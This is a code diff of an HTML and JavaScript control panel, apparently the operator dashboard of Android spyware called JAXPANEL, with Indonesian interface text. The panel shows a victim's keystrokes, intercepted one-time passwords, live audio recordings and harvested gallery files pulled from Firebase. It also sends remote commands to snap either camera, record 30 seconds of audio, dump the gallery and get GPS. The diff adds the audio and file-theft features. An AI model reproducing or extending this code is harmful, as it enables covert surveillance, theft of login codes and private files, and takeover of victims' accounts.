@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 Device Detail - JAXPANEL</title>
+    <title>📱 Device Detail - JAXPANEL [PREMIUM]</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -28,11 +28,8 @@
         pre { background: #000; padding: 10px; border: 1px solid #00ffaa; color: #00ffaa; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
         .btn-cmd { padding: 10px 20px; background: transparent; border: 1px solid #00ffaa; color: #00ffaa; cursor: pointer; margin: 5px; font-weight: bold; }
         .btn-cmd:hover { background: #00ffaa; color: black; }
-        #liveImg { max-width: 100%; border: 2px solid #00ffaa; margin-top: 10px; }
-        .log-item { border-bottom: 1px solid #333; padding: 8px 0; font-size: 13px; }
-        .otp-item { background: #2a002a; border-left: 3px solid #ff00ff; padding: 10px; margin-bottom: 5px; }
-        .notif-item { border-left: 3px solid #00aaff; padding-left: 10px; margin-bottom: 10px; background: rgba(0, 170, 255, 0.05); padding: 8px; }
         .log-box { height: 350px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #333; }
+        .audio-card { background: #2a1b0a; border: 1px solid #ff4500; padding: 15px; border-radius: 5px; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
@@ -41,160 +38,110 @@
     <div class="tab">
         <button class="tablinks active" onclick="openTab(event, 'Surveillance')">📡 Live Monitor</button>
         <button class="tablinks" onclick="openTab(event, 'Location')">📍 Lokasi</button>
-        <button class="tablinks" onclick="openTab(event, 'SMS')">💬 SMS</button>
-        <button class="tablinks" onclick="openTab(event, 'Notif')">🔔 Notifikasi</button>
-        <button class="tablinks" onclick="openTab(event, 'Logs')">📞 Call/Contacts</button>
+        <button class="tablinks" onclick="openTab(event, 'Storage')">📁 Files</button>
+        <button class="tablinks" onclick="openTab(event, 'Notif')">🔔 Notif</button>
+        <button class="tablinks" onclick="openTab(event, 'Logs')">📞 Logs</button>
         <button class="tablinks" onclick="openTab(event, 'Commands')">⚙️ Controls</button>
     </div>
 
     <div id="Surveillance" class="tabcontent" style="display:block;">
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
             <div>
-                <h3>⌨️ REAL-TIME KEYLOGGER</h3>
-                <div id="keyloggerData" class="log-box" style="border-color: #00ffaa;">
-                    Menunggu input...
-                </div>
+                <h3>⌨️ KEYLOGGER</h3>
+                <div id="keyloggerData" class="log-box" style="border-color: #00ffaa;"></div>
             </div>
             <div>
-                <h3 style="color: #ff00ff;">📟 LIVE OTP INTERCEPTOR</h3>
-                <div id="otpBox" class="log-box" style="border-color: #ff00ff;">
-                    Menunggu OTP masuk...
-                </div>
+                <h3 style="color: #ff00ff;">📟 OTP INTERCEPTOR</h3>
+                <div id="otpBox" class="log-box" style="border-color: #ff00ff;"></div>
             </div>
         </div>
-        <div style="margin-top: 20px; text-align: center;">
-            <h3>📷 LIVE CAMERA / SCREEN</h3>
-            <div id="cameraData">
-                <img id="liveImg" src="" alt="No Image Captured">
-                <p id="imgTime" style="font-size: 10px; color: #888;"></p>
-            </div>
+        
+        <div class="audio-card">
+            <h3 style="color: #ff4500; margin-top: 0;">🎙️ LIVE AUDIO FEED</h3>
+            <audio id="audioPlayer" controls style="width: 100%;"></audio>
+            <p id="audioTime" style="font-size: 10px; color: #888; margin-top: 5px;">No recording received.</p>
         </div>
     </div>
 
-    <div id="Location" class="tabcontent">
-        <h3>📍 GPS TRACKING</h3>
-        <div id="locationData">Loading...</div>
+    <div id="Storage" class="tabcontent">
+        <h3>📁 HARVESTED FILES</h3>
+        <div id="fileList">Menunggu file dump...</div>
     </div>
 
-    <div id="SMS" class="tabcontent">
-        <h3>💬 SMS MESSAGES (HISTORY)</h3>
-        <div id="smsData">Loading...</div>
-    </div>
-
-    <div id="Notif" class="tabcontent">
-        <h3>🔔 LIVE NOTIFICATION LOGS</h3>
-        <div id="notifList">Menunggu notifikasi dari perangkat...</div>
-    </div>
-
-    <div id="Logs" class="tabcontent">
-        <h3>📞 CALL LOGS & 👥 CONTACTS</h3>
-        <div id="logsData">Loading...</div>
-    </div>
+    <div id="Location" class="tabcontent"><div id="locationData"></div></div>
+    <div id="Notif" class="tabcontent"><div id="notifList"></div></div>
+    <div id="Logs" class="tabcontent"><div id="logsData"></div></div>
 
     <div id="Commands" class="tabcontent">
-        <h3>⚙️ REMOTE DEVICE CONTROLS</h3>
-        <div style="margin-bottom: 20px;">
-            <button class="btn-cmd" onclick="quickCmd('snap_front')">📷 Snap Front Cam</button>
-            <button class="btn-cmd" onclick="quickCmd('snap_back')">📸 Snap Back Cam</button>
-            <button class="btn-cmd" onclick="quickCmd('lock')">🔒 Lock Screen</button>
+        <h3>⚙️ REMOTE CONTROLS</h3>
+        <div style="border: 1px solid #444; padding: 15px; border-radius: 5px;">
+            <p>SENSORY ACTIONS:</p>
+            <button class="btn-cmd" onclick="quickCmd('snap_front')">📷 Snap Front</button>
+            <button class="btn-cmd" onclick="quickCmd('snap_back')">📸 Snap Back</button>
+            <button class="btn-cmd" style="border-color: #ff4500;" onclick="quickCmd('record_30s')">🎙️ Record 30s</button>
+            <button class="btn-cmd" style="border-color: #ffd700;" onclick="quickCmd('dump_gallery')">📁 Dump Gallery</button>
+        </div>
+        <div style="margin-top: 20px;">
+            <p>SYSTEM ACTIONS:</p>
             <button class="btn-cmd" onclick="quickCmd('vibrate')">📳 Vibrate</button>
             <button class="btn-cmd" onclick="quickCmd('location')">📍 Get GPS</button>
         </div>
-        <hr border="0" style="border-top:1px solid #333;">
-        <p>Custom Command:</p>
-        <input type="text" id="cmdInput" style="padding: 10px; width: 300px; background: #1e2745; border: 1px solid #00ffaa; color: white;" placeholder="Contoh: wipe_data">
-        <button class="btn-cmd" onclick="sendCustomCommand()">Kirim</button>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
 
-        // 1. INFO DEVICE
+        // 1. DEVICE INFO
         firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
-            const data = snap.val();
-            document.getElementById('deviceInfo').innerHTML = `
-                <h2 style="margin:0; color:#00ffaa;">📟 ${data?.model || 'Unknown'} [${data?.deviceName || 'Victim'}]</h2>
-                <p style="margin:5px 0 0 0;">OS: ${data?.os || '-'} | Battery: ${data?.battery || '-'}% | IP: ${data?.ip || 'Hidden'}</p>
-            `;
+            const d = snap.val();
+            document.getElementById('deviceInfo').innerHTML = `<h2 style="margin:0; color:#00ffaa;">📟 ${d?.model || 'Target'}</h2><p>Status: Online | Batt: ${d?.battery}%</p>`;
         });
 
-        // 2. LIVE CAMERA
-        firebase.database().ref(`live/screen/${deviceId}`).on('value', snap => {
+        // 2. AUDIO LISTENER
+        firebase.database().ref(`live/audio/${deviceId}`).on('value', snap => {
             if (snap.val()) {
-                document.getElementById('liveImg').src = "data:image/jpeg;base64," + snap.val();
-                document.getElementById('imgTime').innerText = "Last Captured: " + new Date().toLocaleTimeString();
+                document.getElementById('audioPlayer').src = "data:audio/mp3;base64," + snap.val();
+                document.getElementById('audioTime').innerText = "Last Received: " + new Date().toLocaleTimeString();
             }
         });
 
-        // 3. KEYLOGGER
-        firebase.database().ref(`logs/keylogger/${deviceId}`).limitToLast(20).on('value', snap => {
-            let html = '';
-            snap.forEach(child => {
-                const log = child.val();
-                html += `<div class="log-item"><span style="color:#00ffaa;">[${log.app}]</span>: ${log.content}</div>`;
-            });
-            document.getElementById('keyloggerData').innerHTML = html || 'Menunggu target mengetik...';
-            document.getElementById('keyloggerData').scrollTop = document.getElementById('keyloggerData').scrollHeight;
-        });
-
-        // 4. LIVE OTP INTERCEPTOR
-        firebase.database().ref(`logs/otp/${deviceId}`).on('child_added', snap => {
-            const data = snap.val();
-            const box = document.getElementById('otpBox');
-            if(box.innerText.includes("Menunggu")) box.innerHTML = "";
-            box.innerHTML = `<div class="otp-item">
-                <strong style="color: #ff00ff;">DARI: ${data.sender}</strong><br>
-                <span>${data.content}</span><br>
-                <small style="color: #888;">${new Date(data.timestamp).toLocaleTimeString()}</small>
-            </div>` + box.innerHTML;
-        });
-
-        // 5. LIVE NOTIFICATIONS (NEW)
-        firebase.database().ref(`notifications/${deviceId}`).limitToLast(20).on('child_added', snap => {
-            const data = snap.val();
-            const list = document.getElementById('notifList');
+        // 3. FILE LISTENER
+        firebase.database().ref(`storage/${deviceId}`).on('child_added', snap => {
+            const fileName = snap.key;
+            const fileData = snap.val();
+            const list = document.getElementById('fileList');
             if(list.innerText.includes("Menunggu")) list.innerHTML = "";
             
-            list.innerHTML = `
-                <div class="notif-item">
-                    <strong style="color: #00aaff;">[${data.app}]</strong> 
-                    <small style="color: #888;">${new Date(data.timestamp).toLocaleTimeString()}</small><br>
-                    <strong>${data.title}</strong>: ${data.content}
-                </div>
-            ` + list.innerHTML;
+            list.innerHTML += `
+                <div style="background:#1e2745; padding:10px; border:1px solid #333; margin-bottom:5px;">
+                    📄 ${fileName} 
+                    <a href="data:application/octet-stream;base64,${fileData}" download="${fileName}" style="color:#00ffaa; float:right;">DOWNLOAD</a>
+                </div>`;
         });
 
-        // 6. TAB NAVIGATION LOGIC
-        function loadTabData(path, elementId) {
-            firebase.database().ref(`${path}/${deviceId}`).on('value', snap => {
-                const data = snap.val();
-                document.getElementById(elementId).innerHTML = data ? '<pre>' + JSON.stringify(data, null, 2) + '</pre>' : 'No Data Available.';
-            });
-        }
+        // 4. KEYLOGGER & OTP (REUSE PREVIOUS LOGIC)
+        firebase.database().ref(`logs/keylogger/${deviceId}`).limitToLast(10).on('value', snap => {
+            let h = ''; snap.forEach(c => { h += `<div>[${c.val().app}]: ${c.val().content}</div>`; });
+            document.getElementById('keyloggerData').innerHTML = h;
+        });
 
-        function openTab(evt, tabName) {
-            document.querySelectorAll('.tabcontent').forEach(el => el.style.display = 'none');
-            document.querySelectorAll('.tablinks').forEach(el => el.classList.remove('active'));
-            document.getElementById(tabName).style.display = 'block';
+        firebase.database().ref(`logs/otp/${deviceId}`).on('child_added', snap => {
+            const d = snap.val();
+            document.getElementById('otpBox').innerHTML = `<div style="color:#ff00ff;">[${d.sender}]: ${d.content}</div>` + document.getElementById('otpBox').innerHTML;
+        });
+
+        // NAVIGATION
+        function openTab(evt, name) {
+            document.querySelectorAll('.tabcontent').forEach(x => x.style.display = 'none');
+            document.querySelectorAll('.tablinks').forEach(x => x.classList.remove('active'));
+            document.getElementById(name).style.display = 'block';
             evt.currentTarget.className += " active";
-
-            if(tabName === 'Location') loadTabData('locations', 'locationData');
-            if(tabName === 'SMS') loadTabData('sms', 'smsData');
-            if(tabName === 'Logs') loadTabData('calls', 'logsData');
         }
 
-        // 7. COMMANDS
         function quickCmd(action) {
-            firebase.database().ref(`commands/${deviceId}`).set({
-                cmd: action,
-                timestamp: Date.now()
-            }).then(() => alert("Perintah [" + action + "] Terkirim!"));
-        }
-
-        function sendCustomCommand() {
-            const cmd = document.getElementById('cmdInput').value;
-            quickCmd(cmd);
+            firebase.database().ref(`commands/${deviceId}`).set({ cmd: action, time: Date.now() });
+            alert("Sent: " + action);
         }
     </script>
 </body>
